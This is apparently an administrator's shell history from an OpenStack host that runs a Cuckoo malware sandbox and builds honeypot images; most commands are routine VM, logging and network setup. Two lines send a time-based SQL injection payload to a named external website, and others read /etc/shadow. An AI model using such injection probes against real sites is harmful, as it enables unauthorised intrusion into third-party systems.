@@ -1,0 +1,1000 @@
+    1  pign 4.2.2.4
+    2  ping 4.2.2.4
+    3  date --help
+    4  hwclock --show
+    5  hwclock --show -utc
+    6  hwclock --show
+    7  hwclock --show --utc
+    8  date -s "13 OCT 2014 00:25:17"
+    9  date
+   10  hwclock -w
+   11  ll
+   12  >compute.log 
+   13  ll
+   14  more compute.log 
+   15  >compute.log 
+   16  reboot
+   17  ifdown br0
+   18  ifdown eth0
+   19  ifup br0
+   20  ifup eth0
+   21  exit
+   22  nova boot --image f5be7a7e-f90b-4a4a-9fa4-5743a25c0cc2 --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor android --availability-zone nova:compute1 Cuckoo_Android_C1_1f0
+   23  cd /var/log/nova
+   24  ll
+   25  more compute.log 
+   26  openstack-status 
+   27  clock
+   28  exit
+   29  nova boot --image f5be7a7e-f90b-4a4a-9fa4-5743a25c0cc2 --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor android --availability-zone nova:compute1 Cuckoo_Android_C1_1f2
+   30  nova boot --image f5be7a7e-f90b-4a4a-9fa4-5743a25c0cc2 --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor android --availability-zone nova:compute1 Cuckoo_Android_C1_1f1
+   31  ll
+   32  cd /var/log/nova
+   33  ll
+   34  more compute.log 
+   35  >compute.log 
+   36  ll
+   37  tail api.log 
+   38  tail api.log ll
+   39  ll
+   40  >api.log 
+   41  >compute.log 
+   42  or
+   43  sr
+   44  os
+   45  osr
+   46  cd ~
+   47  ll
+   48  lll
+   49  ll
+   50  cd /root/
+   51  more ~/.bashrc
+   52  nr
+   53  os
+   54  nova boot --image f5be7a7e-f90b-4a4a-9fa4-5743a25c0cc2 --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor android --availability-zone nova:compute1 Cuckoo_Android_C1_1f3
+   55  nova boot --image f5be7a7e-f90b-4a4a-9fa4-5743a25c0cc2 --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor android --availability-zone nova:compute1 Cuckoo_Android_C1_1f4
+   56  nova reset-state --scheduling Cuckoo_Android_C1_1f3
+   57  nova reset-state --scheduling 6add0626-f63b-489e-9cee-189ed3d68982
+   58  nova reset-state 6add0626-f63b-489e-9cee-189ed3d68982
+   59  cd /var/log/nova
+   60  ll
+   61  >compute.log 
+   62  >api.log 
+   63  nova reset-state 6add0626-f63b-489e-9cee-189ed3d68982
+   64  ll
+   65  more compute.log 
+   66  reboot 
+   67  cd /var/log/nova/
+   68  Lil
+   69  Lul
+   70  ll
+   71  less compute.log 
+   72  >compute.log 
+   73  nova reset-state 6add0626-f63b-489e-9cee-189ed3d68982 
+   74  ll
+   75  ifbr0 down
+   76  ifdownb 0r
+   77  ifdownb br0\
+   78  ifdownb rth0
+   79  ifdownb rrth0
+   80  ifdown br0
+   81  ifdown eth0
+   82  ifup br0
+   83  ifup eth0
+   84  cd /var/log/nova
+   85  ll
+   86  rm *.gz -f
+   87  >compute.log 
+   88  >api.log
+   89  ll
+   90  nova-manage service list
+   91  nr
+   92  nova-manage service list
+   93  ll
+   94  tail compute.log 
+   95  cd ..
+   96  ll
+   97  rm -f *.gz
+   98  ll
+   99  tail mysqld.log `
+  100  q
+  101  `
+  102  tail mysqld.log
+  103  neutron agent-list
+  104  ping compute1
+  105  nova-manage service list
+  106  ntpdate
+  107  date
+  108  yum install ntp
+  109   rpm -qa | grep nova-common
+  110  service ntpd start
+  111  The examples in this guide configure the controller node as the reference server and any additional nodes to set their time from the controller node.
+  112  chkconfig ntpd on
+  113  date
+  114  ntpd
+  115  ping 0.centos.pool.ntp.org
+  116  ping pool.ntp.org
+  117  ntpdate 0.centos.pool.ntp.org
+  118  service ntpd stop
+  119  ntpdate 0.centos.pool.ntp.org
+  120  service ntpd start
+  121  vi /etc/ntp.conf 
+  122  service ntpd stop
+  123  service ntpd start
+  124  ll
+  125  ll ntpstats/
+  126  ll
+  127  ll ntpstats/
+  128  date
+  129  vi /etc/ntp.conf 
+  130  service ntpd restart
+  131  vi /etc/ntp.conf 
+  132  service ntpd restart
+  133  vi /etc/ntp.conf 
+  134  service ntpd restart
+  135  ntpd -q
+  136  ntpq -p 
+  137  ntpdc -c monlist
+  138  ===============================================================================
+  139  compute1                 123 172.18.72.139          2 3 4    180     44      21
+  140  [root@controller ~]# 
+  141  ntpdc -c monlist
+  142  date
+  143  ntpq -p
+  144  or
+  145  os
+  146  or
+  147  nova-manage service lisrt
+  148  nova-manage service list
+  149  service openstack-nova-compute restart
+  150  ll
+  151  cd /var/log/nova
+  152  ll
+  153  more compute.log 
+  154  &ll
+  155  ll
+  156  >compute.log 
+  157  >api.log 
+  158  ll
+  159  reboot
+  160  ifdown br0
+  161  ifdown eth0
+  162  ifup br0
+  163  ifup eth0
+  164  exit
+  165  openstask-status
+  166  openstak-status
+  167  openstack-status
+  168  cd /var/log/nova
+  169  ll
+  170  more compute.log 
+  171  nova-manage service list
+  172  date
+  173  ifdown bro0
+  174  ifdown br0
+  175  ifdown eth0
+  176  ifup br0
+  177  ifup eth0
+  178  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --key_name mykey Cuckoo_Windows_CO_1df
+  179  nova boot --image f5be7a7e-f90b-4a4a-9fa4-5743a25c0cc2 --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor android --availability-zone nova:compute1 Cuckoo_Android_C1_1F2
+  180  cd ~vhr/cuckoo/utils/
+  181  lll
+  182  l
+  183  ll
+  184  ./clean.sh && ./submit.py --platform android schedule_sms.apk 
+  185  virsh
+  186  ping 10.0.0.17
+  187  adb connect 10.0.0.17
+  188  adb -s 10.0.0.17:5555 logcat -c
+  189  adb -s 10.0.0.17 logcat -c
+  190  adb  logcat -c
+  191  adb list
+  192  adb wait-for-device 10.0.0.17
+  193  adb devices
+  194  adb connect 10.0.0.17
+  195  adb devices
+  196  adb wait-for-device 10.0.0.17
+  197  adb wait-for-device 
+  198  adb -s 10.0.0.17 logcat -c
+  199  adb -s 10.0.0.17:5555 logcat -c
+  200  adb wait-for-device 
+  201  adb wait-for-device -s 10.0.0.17:5555
+  202  adb -s 10.0.0.17:5555 logcat -c
+  203  adb wait-for-device -s 10.0.0.17:5555 logcat -c
+  204  adb -s 10.0.0.17:5555 wait-for-device logcat -c
+  205  ./clean.sh && ./submit.py --platform android schedule_sms.apk 
+  206  adb devices
+  207  adb shell am start
+  208  adb shell am start --ignore-crashes
+  209  ./clean.sh && ./submit.py --platform android schedule_sms.apk 
+  210  adb connect 10.00.0.17:5555
+  211  adb disconnect
+  212  adb connect 10.0.0.17:5555
+  213  ./clean.sh && ./submit.py --platform android schedule_sms.apk 
+  214  adb devices
+  215  ./clean.sh && ./submit.py --platform android schedule_sms.apk 
+  216  ./clean.sh && ./submit.py ~vhr/Desktop/9/hgbb.exe 
+  217  ./clean.sh && ./submit.py ~vhr/Desktop/9/hhhh.exe 
+  218  ./clean.sh && ./submit.py ~vhr/Desktop/9/Hav1j_1.17_Pro.exe 
+  219  nova-manage service list
+  220  cd /var/log/nova
+  221  ll
+  222  more compute.log 
+  223   mysql -u nova -p -d nova
+  224   mysql -u nova -p
+  225  >compute.log 
+  226  ll
+  227  nova reset-state --active 81ed49a8-9c8c-4071-addb-41a571e3379d
+  228  virsh 
+  229  ll
+  230  more compute.log 
+  231  cd ~vhr/cuckoo
+  232  ll
+  233  ./cuckoo.py -d
+  234  top
+  235  adb discounnect
+  236  adb disconnect
+  237  ping 
+  238  ./cuckoo.py -d
+  239  top
+  240  adb disconnect
+  241  adb devices
+  242  top
+  243  ./cuckoo.py -d
+  244  adb shell am start --ignore-crashes
+  245  adb shell am --ignore-crashes start
+  246  adb shell am --ignore-crashes
+  247  adb shell --ignore-crashes
+  248  adb --ignore-crashes
+  249  adb devies
+  250  adb devices
+  251  adb -s wait-for-device 10.0.0.7:5555
+  252  adb wait-for-device -s 10.0.0.7:5555
+  253  adb -wait-for-device -s 10.0.0.7:5555
+  254  adb --wait-for-device -s 10.0.0.7:5555
+  255  adb --wait-for-device
+  256  adb wait-for-device -s 10.0.0.7:5555
+  257  adb wait-for-device
+  258  adb wait-for-device -s
+  259  adb -s 10.0.0.17:5555 wait-for-device
+  260  adb disconnect
+  261  adb -s 10.0.0.17:5555 wait-for-device
+  262  adb devices
+  263  adb -s 10.0.0.17:5555 wait-for-device
+  264  ./cuckoo.py -d
+  265  adb devices
+  266  top
+  267  adb devices
+  268  adb connect 10.0.0.17:5555
+  269  adb devices
+  270  adb disconnect
+  271  adb devices
+  272  adb connect 10.0.0.17:5555 wait-for-device
+  273  adb connect 10.0.0.17:5555
+  274  adb wait-for-device
+  275  ./cuckoo.py -d
+  276  top
+  277  netstat -tulpn
+  278  netstat -tulpn | grep "2042"
+  279  kill 22174
+  280  netstat -tulpn | grep "adb"
+  281  kill 21804
+  282  ./cuckoo.py -d
+  283  netstat -tulpn | grep "adb"
+  284  ./cuckoo.py -d
+  285  netstat -tulpn | grep "adb"
+  286  kill 25375
+  287  netstat -tulpn | grep "adb"
+  288  ./cuckoo.py -d
+  289  python
+  290  ./cuckoo.py -d
+  291  cd /var/log/nova
+  292  l
+  293  ll
+  294  rm compute.log-20141026.gz -f
+  295  more compute.log 
+  296  tail compute.log 
+  297  tail api.log 
+  298  more api.log 
+  299  l
+  300  ll
+  301  >api.log 
+  302  >compute.log 
+  303  ll
+  304  >compute.log `
+  305  ;
+  306  q
+  307  `\
+  308  >compute.log
+  309  ll
+  310  exit
+  311  cd /qcow2/
+  312  ll
+  313  exit
+  314  cd /qu
+  315  cd /qcow2/
+  316  ll
+  317  qemu-img create -f qcow2 -b winxp.qcow2 instance-000001fe.qcow2
+  318  qemu-img create -f qcow2 -b winxp.qcow2 instance-000001ff.qcow2
+  319  ll
+  320  cd /var/log/nova/
+  321  ll
+  322  more compute.log 
+  323  ping 10.0.0.11
+  324  ping 10.0.0.12
+  325  ping 10.0.0.13
+  326  ping 10.0.0.16
+  327  ping 10.0.0.21
+  328  ping 10.0.0.22
+  329  virsh
+  330  cd /qcow2/
+  331  ll
+  332  cp instance-000001fe.qcow2 instance-000001fe.qcow2.org
+  333  cp instance-000001ff.qcow2 instance-000001ff.qcow2.org
+  334  ll
+  335  cp instance-000001ff.qcow2.org instance-000001ff.qcow2
+  336  yes | cp instance-000001ff.qcow2.org instance-000001ff.qcow2
+  337  virsh
+  338  ll
+  339  rm instance-000001ff* -f
+  340  ll
+  341  cp instance-000001fe.qcow2 instance-000001fe.qcow2.org
+  342  ll
+  343  ll -h
+  344  ping compute1
+  345  ssh root@compute1
+  346  cd ~vhr/cuckoo/utils/
+  347  ./clean.sh 
+  348  ll
+  349  ./submit.py ~vhr/Desktop/50-2/cpu.exe 
+  350  ./submit.py ~vhr/Desktop/50-2/Djavan\ -\ Se.exe 
+  351  ./clean.sh 
+  352  virsh
+  353  ll /qo
+  354  ll /qcow2/
+  355  rm /qcow2/instance-000001e* -f
+  356  ll /qcow2/
+  357  openstack-status
+  358  ll
+  359  openstack-status
+  360  nova reset-state d36ea14a-c176-455c-a0e7-8552f8e00968
+  361  nova reset-state --rebuild d36ea14a-c176-455c-a0e7-8552f8e00968
+  362  nova reset-state --active d36ea14a-c176-455c-a0e7-8552f8e00968
+  363  ./submit.py ~vhr/Desktop/50-2/Djavan\ -\ Se.exe 
+  364  ./clean.sh 
+  365  ./submit.py ~vhr/Desktop/50-2/Djavan\ -\ Se.exe 
+  366  ./clean.sh  && ./submit.py ~vhr/Desktop/50-2/Djavan\ -\ Se.exe 
+  367  ./clean.sh
+  368  ./clean.sh  && ./submit.py ~vhr/Desktop/50-2/Djavan\ -\ Se.exe 
+  369  ll ../log/
+  370  ./clean.sh  && ./submit.py ~vhr/Desktop/50-2/Djavan\ -\ Se.exe 
+  371  ./clean.sh
+  372  ./submit.py ~vhr/Desktop/100/
+  373  ./submit.py --platform=android schedule_sms.apk
+  374  more ../storage/analyses/101/droidbox_output.log 
+  375  ./clean.sh
+  376  ./submit.py ~vhr/Desktop/100/
+  377  ./clean.sh
+  378  ./submit.py ~vhr/Desktop/100/
+  379  ./clean.sh
+  380  ./submit.py ~vhr/Desktop/100/
+  381  free -m
+  382  free -m && sync && echo 3 > /proc/sys/vm/drop_caches && free -m
+  383  ./clean.sh
+  384  ./submit.py ~vhr/Desktop/100/
+  385  ./clean.sh
+  386  ./submit.py ~vhr/Desktop/100/
+  387  ./clean.sh 
+  388  ./submit.py ~vhr/Desktop/100/
+  389  ./clean.sh 
+  390  ./submit.py ~vhr/Desktop/100/
+  391  ./clean.sh 
+  392  ./submit.py ~vhr/Desktop/100/
+  393  ./clean.sh 
+  394  ./submit.py ~vhr/Desktop/1/hack\ facebook.exe 
+  395  ./clean.sh 
+  396  ./submit.py ~vhr/Desktop/200/a7768f4973ad7cf8217212a4d12dbae0.exe 
+  397  ./clean.sh 
+  398  ./submit.py ~vhr/Desktop/50-2/DK231.exe 
+  399  ./clean.sh 
+  400  ./submit.py ~vhr/Desktop/100/
+  401  ./clean.sh 
+  402  ./submit.py ~vhr/Desktop/1000/
+  403  ./clean.sh 
+  404  ./submit.py ~vhr/Desktop/200/
+  405  ./clean.sh 
+  406  ./submit.py ~vhr/Desktop/200/
+  407  ./clean.sh 
+  408  ./submit.py ~vhr/Desktop/100/
+  409  ./submit.py --platform=android schedule_sms.apk 
+  410  ./clean.sh 
+  411  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1F4
+  412  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1F5
+  413  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1F6
+  414  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1F7
+  415  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1F8
+  416  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1F9
+  417  ifconfig
+  418  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1FA
+  419  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1FB
+  420  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1FC
+  421  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:compute1 --key_name mykey Cuckoo_Windows_C1_1FD
+  422  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:controller --key_name mykey Cuckoo_Windows_C1_1FE
+  423  nova boot --image e7c55971-bdf3-4619-961f-ece4a04de36b --nic net-id=4931178a-dfae-4aa9-abab-d92ada781c93 --flavor m1.tiny --availability-zone nova:controller --key_name mykey Cuckoo_Windows_C1_1FF
+  424  cd ~vhr/cuckoo/utl
+  425  cd ~vhr/cuckoo/utils/
+  426  ll
+  427  ./clean.sh 
+  428  ./submit.py --platform android schedule_sms.apk 
+  429  ./submit.py ~vhr/Desktop/100/
+  430  ./clean.sh 
+  431  ./submit.py ~vhr/Desktop/100/
+  432  ./clean.sh 
+  433  ./submit.py --platform android ~vhr/Desktop/apk/
+  434  ./clean.sh 
+  435  ./submit.py --platform android ~vhr/Desktop/apk/
+  436  ./clean.sh 
+  437  ./submit.py --platform android ~vhr/Desktop/apk/
+  438  cd ~vhr/cuckoo
+  439  ll
+  440  ./cuckoo.py -d
+  441  ll
+  442  vi conf/cuckoo.conf 
+  443  ./cuckoo.py -d
+  444  python
+  445  ./cuckoo.py -d
+  446  ping 172.18.72.2
+  447  ifconfig
+  448  ./cuckoo.py -d
+  449  free -m && sync && echo 3 > /proc/sys/vm/drop_caches && free -m
+  450  ./cuckoo.py -d
+  451  cd ~vhr/cuckoo
+  452  ./cuckoo.py -d
+  453  virt-manager 
+  454  halt
+  455  virt-manager 
+  456  ifconfig | more
+  457  service openstack-nova stop
+  458  service --list
+  459  service openstack-nova-compute stop
+  460  cd /etc/sysconfig/network-scripts/
+  461  ls
+  462  cat ifcfg-br100 
+  463  cat ifcfg-br200
+  464  cat ifcfg-br300
+  465  ls
+  466  cat ifcfg-eth0
+  467  cat ifcfg-br0 
+  468  vi ifcfg-br0 
+  469  ping 172.18.72.139
+  470  vi ifcfg-br100
+  471  halt
+  472  virt-manager 
+  473  service openstack-nova-compute stop
+  474  chkconfig openstack-nova-compute off
+  475  ifconfig eth0
+  476  ifconfig
+  477  ping 119.40.125.1
+  478  ping 119.40.125.3
+  479  ping 119.40.125.30
+  480  ping 119.40.125.31
+  481  ping 119.40.125.30
+  482  ping 4.2.2.4
+  483  service networking restart
+  484  netstat -rn
+  485  ll
+  486  cd /etc/sysconfig/network-scripts/
+  487  ll
+  488  ls
+  489  vi ifcfg-br0
+  490  vi ifcfg-br100
+  491  ifdown br100
+  492  ifup br100
+  493  ping 4.2.2.4
+  494  ping 8.8.8.8
+  495  netstat -rn
+  496  ssh admin@119.40.125.1
+  497  ping 8.8.8.8
+  498  ssh root@neynawa.ir
+  499  ssh admin@119.40.125.1
+  500  exit
+  501  virt-manager 
+  502  ssh root@neynawa.ir
+  503  exit
+  504  cd /etc/sysconfig/network-scripts/
+  505  ll
+  506  ls
+  507  vi ifcfg-br100 
+  508  cp ifcfg-br100 ifcfg-br100.beforipvalid
+  509  vi ifcfg-br100 
+  510  ifdown br100
+  511  ifup br100
+  512  ping 119.40.125.1
+  513  ping 8.8.8.8
+  514  sh ip route
+  515  netstat -rn
+  516  ping 119.40.125.1
+  517  ping 8.8.8.8
+  518  su vhr
+  519  virsh
+  520  service openstack-nova-compute status
+  521  virsh
+  522  time wget -qO- "http://sqooge.com/namecard/show/1;waitfor+delay'0:0:5'--&p=1/*%21and+sleep(5)*/#" 
+  523  time wget -O- http://sqooge.com/namecard/show/1
+  524  time wget -qO- "http://sqooge.com/namecard/show/1;waitfor+delay'0:0:5'--&p=1/*%21and+sleep(5)*/#" 
+  525  tail /var/log/messages
+  526  cat /var/log/messages
+  527  yum update
+  528  yum install net-snmp-utils
+  529  yum install net-snmp
+  530  cd cd /etc/snmp
+  531  cd /etc/snmp
+  532  vi snmpd.conf 
+  533  echo 'syslocation "My Location"' >> snmpd.conf
+  534  echo 'syscontact  "Dan Massey"' >> snmpd.conf
+  535  echo 'sysservices 76' >> snmpd.conf
+  536  echo '' >> snmpd.conf
+  537  echo 'rocommunity public localhost' >> snmpd.conf
+  538  echo 'rocommunity  mycommstring  ip address' >> snmpd.conf
+  539  echo '' >> snmpd.conf
+  540  echo 'disk /' >> snmpd.conf
+  541  vi snmpd.conf 
+  542  c
+  543  cd /
+  544  cd /qcow2/haas/
+  545  ls
+  546  ll
+  547  cp ls
+  548  ll
+  549  cp centos_server_minimal_base.qcow2 centos_server_minimal_base_kham.qcow2
+  550  vi /etc/snmp/snmpd.conf 
+  551  ifconfig
+  552  echo rocommunity freelinuxtutorials >> /etc/snmp/snmpd.conf
+  553  snmpwalk -c freelinuxtutorials -v 1
+  554  snmpwalk -c freelinuxtutorials -v1 127.0.0.1
+  555  vi /etc/snmp/snmpd.conf 
+  556  snmpwalk -c public -v1 127.0.0.1
+  557  service snmpd status
+  558  service snmpd start
+  559  snmpwalk -c public -v1 127.0.0.1
+  560  df -h
+  561  vi /etc/snmp/snmpd.conf 
+  562  service snmpd restart
+  563  ll
+  564  rm -f ubuntu1*
+  565  ll
+  566  df -h
+  567  vi /etc/snmp/snmpd.conf 
+  568  service snmpd restart
+  569  cd ..
+  570  cd haas/
+  571  ll
+  572  co mikrotik.qcow2 mikrotik.qcow2.temp
+  573  cp mikrotik.qcow2 mikrotik.qcow2.temp
+  574  cp mikrotik.qcow2 mikrotik.qcow2.temp1
+  575  ll
+  576  rm mikrotik.qcow2.temp
+  577  rm mikrotik.qcow2.temp1 
+  578  ll
+  579  cp mikrotik.qcow2 mikrotik.qcow2.temp
+  580  cp mikrotik.qcow2 mikrotik.qcow2.temp1
+  581  ll
+  582  rm mikrotik.qcow2.temp
+  583  rm mikrotik.qcow2.temp1 
+  584  fdisk -l
+  585  ll
+  586  lvm 
+  587  vlg
+  588  vgs
+  589  ping 172.18.72.140
+  590  ping 172.18.72.139
+  591  ping 172.18.72.141
+  592  service openstack-nova-compute status
+  593  uname -a
+  594  uptime
+  595  users
+  596  service openstack-nova-compute stop
+  597  ping 8.8.8.8 
+  598  service openstack-nova-compute start
+  599  cd /qcow2/haas/
+  600  ll
+  601  cp mikrotik.qcow2 mikrotik.qcow2.karmikonebaipvalid 
+  602  service openstack-nova-compute status
+  603  ping 8.8.8.8
+  604  exiy
+  605  exit
+  606  fdisk -l
+  607  df -h
+  608  virsh
+  609  qemu
+  610  qemu-kvm
+  611  kvm-qemu
+  612  tail /var/log/messages
+  613  less /var/log/messages
+  614  tail /var/log/messages -f
+  615  find / -name *.iso
+  616  /dev/pts/
+  617  cd /dev/pt
+  618  cd /dev/pts/
+  619  ls -a
+  620  ll
+  621  rm 5
+  622  virsh
+  623  service libvirtd status
+  624  chkconfig --list libvirtd
+  625  ifconfig
+  626  cd /qcow2/haas/
+  627  l
+  628  ll
+  629  su vhr
+  630  ll
+  631  pwd
+  632  cd /qcow2/haas/
+  633  ll
+  634  rm centos_hi.qcow2
+  635  mv centos_hi.qcow2.temp centos_hi.qcow2
+  636  ll
+  637  virsh
+  638  qemu-kvm
+  639  virsh
+  640  /usr/libexec/qemu-kvm
+  641  /usr/libexec/qemu-kvm: -drive file=/qcow2/haas/centos_hi.qcow2 
+  642  /usr/libexec/qemu-kvm -drive file=/qcow2/haas/centos_hi.qcow2 
+  643  ll
+  644  chown vhr:vhr centos_hi.qcow2 
+  645  /usr/libexec/qemu-kvm -drive file=/qcow2/haas/centos_hi.qcow2 
+  646  fdisk -l
+  647  tail /etc/shadow
+  648  cat /etc/shadow
+  649  cat /etc/passwd
+  650  cat /etc/passwd | grep /bin/bash
+  651  cd /qcow2/
+  652  cd haas/
+  653  ll
+  654  ll -hj
+  655  ll -h
+  656  rm centos_server_minimal_base.qcow2
+  657  find / -size +100M
+  658  ls /var/www/html/download/system.img
+  659  ll /var/www/html/download/system.img
+  660  ll /var/www/html/download/system.img  -h
+  661  ll /var/lib/libvirt/lxc/centos-6-x86_64
+  662  rm /home/vhr/CentOS-6.5-i386-minimal.iso
+  663  ll
+  664  rm /root/hamid/iso/CentOS-6.5-x86_64-minimal.iso -f
+  665  rm /root/hamid/iso/ubuntu-10.04.4-server-amd64.iso -f
+  666  rm /root/hamid/iso/ubuntu-13.04-server-amd64.iso -f
+  667  rm /root/hamid/qcow2/honeywall.qcow2.beduneconfig -f
+  668  df -uh
+  669  df -h
+  670  ll /var/www/html
+  671  cd sca
+  672  cd /var/www/html
+  673  cd scaps/
+  674  ls
+  675  virsh
+  676  df -h
+  677  virsh
+  678  cd /qcow2/haas/
+  679  ll
+  680  chkconfig openstack-nova-compute
+  681  chkconfig openstack-nova-compute 0ff
+  682  chkconfig openstack-nova-compute off
+  683  service openstack-nova-compute stop
+  684  virsh
+  685  ll
+  686  ll -h
+  687  mv centos_hi.qcow2 centos_hi.qcow2.temp
+  688  ll
+  689  cp centos_hi_configshode_ba_sysdig_karmikone.qcow2 centos_hi.qcow2
+  690  ll
+  691  virsh
+  692  ll /qcow2/haas/centos_hi.qcow2
+  693  chmod 777 *
+  694  ll
+  695  virsh
+  696  ll
+  697  chown qemu:qemu centos_hi.qcow2
+  698  cd /var/lib/libvirt/images/
+  699  ll
+  700  chmod go+rx /var/lib/libvirt/images
+  701  chmod o-rwx /var/lib/libvirt/images/*
+  702  cd /qcow2/haas/
+  703  ll
+  704  ll -gZ
+  705  vi /etc/selinux/config 
+  706  ll
+  707  chown qemu:qemu centos_hi.qcow2
+  708  ll
+  709  ll chmod go+rx /var/lib/libvirt/images
+  710  find / -size +100M
+  711  cd /qcow2/haas/
+  712  ll
+  713  mv centos_hi.qcow2 centos_hi.qcow2.dashtkarmikardvalinemikone
+  714  virt-manager 
+  715  virsh
+  716  ll
+  717  cd /qcow2/haas/
+  718  ll
+  719  mv centos_hi.qcow2 centos_hi.qcow2.sysdignasbnemishe
+  720  mv centos_hi.qcow2.dashtkarmikardvalinemikone centos_hi.qcow2
+  721  virsh
+  722  yum install pv
+  723  ll
+  724  mv centos_hi.qcow2 centos_hi.qcow2.dashtkarmikard
+  725  pv centos_hi.qcow2.dashtkarmikard centos_hi.qcow2
+  726  ll
+  727  cd /qcow2/haas/
+  728  ll
+  729  rm centos_hi.qcow2.*
+  730  ll
+  731  history
+  732  history | create
+  733  virt-manager 
+  734  pwd
+  735  cd /qcow2/haas/
+  736  ll
+  737  /usr/bin/qemu-img  create -f qcow2 centos_hi.qcow2 5G
+  738  ll
+  739  mv centos_hi.qcow2 centos_hi_1.qcow2
+  740  ll
+  741  mv centos_hi_1.qcow2 centos_hi.qcow2
+  742  cd /qcow2/haas/
+  743  ll
+  744  rm centos_hi.6kham.qcow2
+  745  rm CentOS-6.6-i386-minimal.iso
+  746  rm centos_hi_configshode_ba_sysdig_karmikone.qcow2
+  747  ll
+  748  rm centos_server_minimal_base_kham.qcow2
+  749  ll
+  750  cp centos_hi.qcow2 centos_hi.qcow2.centosjadidtarbasebekconfigshodekarmikone
+  751  virsh
+  752  yum install syslogd
+  753  yum install rsyslog -y
+  754  vi /etc/rsyslog.
+  755  vi /etc/rsyslog.conf 
+  756  cp /etc/rsyslog.conf /etc/rsyslog.conf.old
+  757  echo > /etc/rsyslog.conf
+  758  vi /etc/rsyslog.conf
+  759  service rsyslog restart
+  760  tail -f /var/log/router.log 
+  761  ping 172.18.72.141
+  762  ifconfig br0
+  763  ping 172.18.72.141
+  764  vi /etc/sysconfig/network-scripts/ifcfg-br0
+  765  vi /etc/sysconfig/network-scripts/ifcfg-eth0
+  766  vi /etc/sysconfig/network-scripts/ifcfg-br0
+  767  vi /etc/sysconfig/network-scripts/ifcfg-eth0
+  768  vi /etc/sysconfig/network-scripts/ifcfg-br0
+  769  tail /var/log/router.log 
+  770  tail /var/log/router.log  -f
+  771  ll /var/log/router.log -h
+  772  ifconfig | more
+  773  ping 172.18.72.141
+  774  cd /var/www/html/
+  775  ll
+  776  ll /var/log/router.log 
+  777  ll /var/log/router.log  -h
+  778  mysql -u workbench -p
+  779  service iptables status
+  780  service iptables stop
+  781  lsof
+  782  lsof -Pni :3306
+  783  vi /etc/my.cnf
+  784  service mysqld restart
+  785  ll
+  786  cd haas/
+  787  ll
+  788  vi index.php 
+  789  vi snapshot_revert.php 
+  790  pwd
+  791  cd ..
+  792  pwd
+  793  vi download_file_from_remote.py 
+  794  virsh
+  795  exit
+  796  vi download_file_from_remote.py 
+  797  cd /var/www/html/
+  798  vi download_file_from_remote.py 
+  799  vi haas/linux_hi.php 
+  800  cd /qcow2/haas/
+  801  ll
+  802  rm centos_hi.qcow2.*
+  803  ll
+  804  history
+  805  history | create
+  806  history | grep create
+  807  qemu-img create -f qcow2 centos_hi.qcow2 8G
+  808  rm centos_hi.qcow2
+  809  qemu-img create -f qcow2 centos_hi.qcow2 8G
+  810  wget http://mirror.nus.edu.sg/centos/6.6/isos/i386/CentOS-6.6-i386-minimal.iso
+  811  ll
+  812  rm CentOS-6.6-i386-minimal.iso 
+  813  wget http://ossm.utm.my/centos/6.6/isos/i386/CentOS-6.6-i386-minimal.iso
+  814  ll
+  815  rm centos_hi.qcow2 
+  816  qemu-img create -f qcow2 centos_hi.qcow2 8G
+  817  ll
+  818  cp centos_hi.qcow2 centos_hi.6kham.qcow2
+  819  yum clean expire-cache
+  820  yum -y install sysdig
+  821  cd /var/www/html/scaps/
+  822  ll
+  823  service snmpd status
+  824  service snmpd restart
+  825  tail /var/log/router.log 
+  826  ll /var/log/router.log 
+  827  ll /var/log/router.log  -h
+  828  df -h
+  829  df -
+  830  df 
+  831  df /dev/sda3
+  832  watch -n 2 df /dev/sda3
+  833  touch /var/log/router_disck.txt
+  834  watch -n 2 df /dev/sda3 > /var/log/router_disck.txt 
+  835  watch -n 2 df /dev/sda3 >> /var/log/router_disck.txt 
+  836  ll
+  837  pwd
+  838  cd /qcow2/haas/
+  839  vi harddisk.sh
+  840  tail /var/log/router_disck.txt 
+  841  tail /var/log/router_disck.txt  -f
+  842  df 
+  843  df -h
+  844  df 
